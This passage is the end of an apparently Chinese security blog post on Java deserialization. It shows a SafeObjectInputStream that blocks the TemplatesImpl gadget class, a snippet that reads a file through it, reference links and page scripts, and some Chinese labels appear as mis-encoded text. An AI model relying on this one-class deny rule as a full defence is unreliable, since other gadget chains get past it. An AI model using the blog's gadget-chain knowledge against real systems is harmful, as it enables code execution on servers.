</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">resolveClass</span><span class="p">(</span><span class="n">ObjectStreamClass</span><span class="w"> </span><span class="n">desc</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">desc</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">className</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span><span class="s">&#34;Deserialization of TemplatesImpl is not allowed!&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">resolveClass</span><span class="p">(</span><span class="n">desc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SafeObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p><strong>å‚è€ƒ</strong></p>
<blockquote>
<p><a href="https://www.cnpanda.net/sec/893.html">https://www.cnpanda.net/sec/893.html</a></p>
<p><a href="https://www.cnpanda.net/sec/928.html">https://www.cnpanda.net/sec/928.html</a></p>
<p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>Furyååºåˆ—åŒ–&amp;aliyunctf-jtool</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/jdbc/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>JDBCç»¼åˆåˆ†æ</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
